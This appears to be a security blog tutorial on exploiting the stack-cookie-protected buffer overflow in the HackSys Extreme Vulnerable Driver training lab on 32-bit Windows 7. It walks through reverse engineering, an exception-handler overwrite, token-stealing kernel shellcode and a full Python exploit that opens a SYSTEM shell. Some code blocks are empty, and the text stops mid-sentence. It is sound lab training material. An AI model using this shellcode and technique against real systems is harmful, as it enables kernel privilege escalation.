Lately, I've decided to play around with [HackSys Extreme Vulnerable Driver
(HEVD)](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) for fun.
It's a great way to familiarize yourself with Windows exploitation. In this
blog post, I'll show how to exploit the stack overflow that is protected with
[/GS stack
cookies](https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check)
on Windows 7 SP1 32 bit. You can find the [source code
here](https://github.com/klue/hevd). It has a few more exploits written and a
Win10 pre-anniversary version of the regular stack buffer overflow
vulnerability.

## Triggering the Vulnerable Function
To start, we need to find the
[ioctl](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx)
dispatch routine in HEVD. Looking for the
[`IRP_MJ_DEVICE_CONTROL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control)
[IRP](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/i-o-request-packets),
we see that the dispatch function can be found at `hevd+508e`.

```
Finding the ioctl request number requires very light reverse engineering. We
want to end up eventually at `hevd+515a`. At `hevd+50b4`, the request number is
subtracted by `222003h`. If it was `222003h`, then jump to `hevd+5172`, or else
fall through to `hevd+50bf`. In this basic block, our ioctl request number is
subtracted by 4. If the result is 0, we are where we want to be. Therefore, our
ioctl number should be `222007h`.
![Finding ioctl number](/images/hevd_stack_gs-finding_ioctl_num.png)

Eventually, a `memcpy` is reached where the calling function does not check the
copy size.
![Vulnerable code](/images/hevd_stack_gs-vulnerable_code.png)

To give the overflow code a quick run, we call it with benign input using the
code below. You can find the implementation of `mmap` and `write` in the full
source code.
```python
def trigger_stackoverflow_gs(addr, size):
    dwReturn = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        sys.exit()

    print "[+] IOCTL: 0x222007"
    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x222007,
                                         addr, size,
                                         None, 0,
                                         byref(dwReturn), None)

m = mmap()
write(m, 'A'*10)
trigger_stackoverflow_gs(m, 10)
```
In WinDbg, the debug output confirms that we are calling the right ioctl. 

<img src="/images/hevd_stack_gs-sample_run.png" width="60%" height="60%"/>

From the figure, we can see that the kernel buffer is 0x200 in size so if we
run a PoC again, but with 0x250 `A`s, we should overflow the stack cookie and
blue screens our VM.

![Overwriting stack cookie](/images/hevd_stack_gs-stack_cookie_overwrite_confirmation.png)

Indeed, the bugcheck tells us that the system crashed due to a stack buffer
overflow. Stack cookies in Windows are first XORed with `ebp` before they're
stored on the stack. If we take the cookie in the bugcheck, and XOR it with
`41414141`, the result should resemble a stack address. Specifically, it should
be the stack base pointer for `hevd+48da`.

## Bypassing Stack Cookies
A common way to bypass stack cookies, introduced by [David
Litchfield](https://dl.packetstormsecurity.net/papers/bypass/defeating-w2k3-stack-protection.pdf),
is to cause the program to throw an exception before the stack cookie is
checked at the end of the function. This works because when an exception
occurs, the stack cookie is not checked.
> There are two ways [generating an exception] might happen--one we can control
> and the other is dependent of the code of the vulnerable function. In the
> latter case, if we overflow other data, for example parameters that were

For us, it's easy because the vulnerable function uses `memcpy`. We can simply
force `memcpy` to segfault by letting it continue copying the source buffer all
the way to unmapped memory.

I use my `mmap` function to map two adjacent pages, then `munmap` to unmap the
second page. `mmap` and `munmap` are just simple wrappers I wrote for
[`NtAllocateVirtualMemory`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566416(v=vs.85).aspx)
and
[`NtFreeVirtualMemory`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff566460(v=vs.85).aspx)
respectively. The idea is to place the source buffer at the end of the mapped
page that was mapped, and have the vulnerable `memcpy` read off into the
unmapped page to cause an exception.

To test this, we'll use the PoC code below.
```python
m = mmap(size=0x2000)
munmap(m+0x1000)

trigger_stackoverflow_gs(m+0x1000-0x250, 0x251)
```
Back in the debugger, we can observe that an exception was thrown and `eip` was
overwritten as a result of the exception handler being overwritten. 
![Exception handler crash](/images/hevd_stack_gs-exception_handler_overwrite_confirmation.png)

The next step is to find the offset of the `A`s so we can control `eip` to
point to shellcode. You can use a binary search type way to find the offset,
but an easier method is to use a [De Bruijn
sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) as the payload. I
usually use Metasploit's
[`pattern_create.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb)
and
[`pattern_offset.rb`](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb)
for finding the exact offset in my buffer.

![Exception handler crash patter_create.rb](/images/hevd_stack_gs-pattern_create_crash.png)

The figure above shows us `41367241` overwrites the exception handler address
and so also `eip`.
```text
kd> .formats 41367241
Evaluate expression:
  Hex:     41367241
  Decimal: 1094087233
  Octal:   10115471101

  Float:   low 11.4029 high 0
  Double:  5.40551e-315
```

Reversing the order due to endianness, we get `Ar6A` which `pattern_offset.rb`
tells us is offset 528 (0x210). Therefore, our source buffer will be of size
0x210+4, where the 4 is due to the address of our shellcode.

## Constructing Shellcode
Since there is 0x1000-0x210-4 unused space in our allocated page, we can just
put our shellcode in the beginning of the page. I use common Windows token
stealing shellcode that basically iterates through the `_EPROCESS`s, looks for
the SYSTEM process, and copies the SYSTEM process' token. Additionally, for
convenience in breaking at the shellcode, I prepend the shellcode with a
breakpoint (`\xcc`).
```text
\xcc\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00
\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8
\x00\x00\x00\x89\x91\xf8\x00\x00\x00
```

Our shellcode still isn't complete yet; the shellcode doesn't know where to
return to after it executes. To search for a return address, let's inspect the
call stack in the debugger when the shellcode executes.

```

`hevd+4969` is the instruction address after the `memcpy`, but we can't return
here because the portion of stack the remaining code uses  is corrupted. Fixing
the stack to the correct values would be extremely annoying. Instead, returning
to `hevd+49ca` which is the return address of the stack frame right below
`hevd+4969` makes more sense.

However, if you adjust the stack and return to `hevd+49ca`, you'll still get a
crash. The problem is at `hevd+5260` where `edi+0x1c` is dereferenced. `edi` at
this point is 0 because registers are XORed with themselves before the
exception handler assumes control and neither the program nor our shellcode
touched `edi`. 

<center>
<img src="/images/hevd_stack_gs-__SEH_epilog4.png" width="40%" height="40%"/>
</center>

In a normal execution, `edi` and other registers are restored in
`__SEH_epilog4`. These values are of course restored from the stack. Taking
`a88cf86c` from the stack trace before, we can dump and attempt to find the
restore values. They're actually are quite easy to find here because
`hevd+5dcc` is quite easy to spot. `hevd+5dcc` is the address of the debug
print string which is restored into `ebx`.

```

To obtain the offset of `edi`, just subtract `esp` from the current address of
the restore value.
```text
kd> ? a88cf8a4 - esp
Evaluate expression: 1932 = 0000078c

a88cfaf4  8586f5f0
kd> ? a88cfad0 - esp
Evaluate expression: 2488 = 000009b8
```
Similarly, finding the offset to return to is found by obtaining the difference
of `a88cfad0` and `esp`.

Lastly, our shellcode should `pop ebp; ret 8;` which results in 
```text
start:
  xor eax, eax;
  mov eax,dword ptr fs:[eax+0x124]; # nt!_KPCR.PcrbData.CurrentThread
  mov eax,dword ptr [eax+0x50];     # nt!_KTHREAD.ApcState.Process
  mov ecx,eax;                      # Store unprivileged _EPROCESS in ecx
loop:
  mov eax,dword ptr [eax+0xb8];     # Next nt!_EPROCESS.ActiveProcessLinks.Flink
  sub eax, 0xb8;                    # Back to the beginning of _EPROCESS
  cmp dword ptr [eax+0xb4],0x04;    # SYSTEM process? nt!_EPROCESS.UniqueProcessId
  jne loop;
stealtoken:
  mov edx,dword ptr [eax+0xf8];     # Get SYSTEM nt!_EPROCESS.Token
  mov dword ptr [ecx+0xf8],edx;     # Copy token
restore:
  mov edi, [esp+0x78c];             # edi irq
  mov esi, [esp+0x790];             # esi
  mov ebx, [esp+0x794];             # move print string into ebx
  add esp, 0x9b8;
  pop ebp;
  ret 0x8;
```
## Gaining NT Authority\SYSTEM
Putting everything together, the final exploit looks like this.
```python
m = mmap(size=0x2000)
munmap(m+0x1000)
size = 0x210+4

sc = '\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x8b\xbc\x24\x8c\x07\x00\x00\x8b\xb4\x24\x90\x07\x00\x00\x8b\x9c\x24\x94\x07\x00\x00\x81\xc4\xb8\x09\x00\x00\x5d\xc2\x08\x00'
write(m, sc + 'A'*(0x1000-4-len(sc)) + struct.pack("<I", m))
trigger_stackoverflow_gs(m+0x1000-size, size+1)

print '\n[+] Privilege Escalated\n'
os.system('cmd.exe')
```
And that should give us:
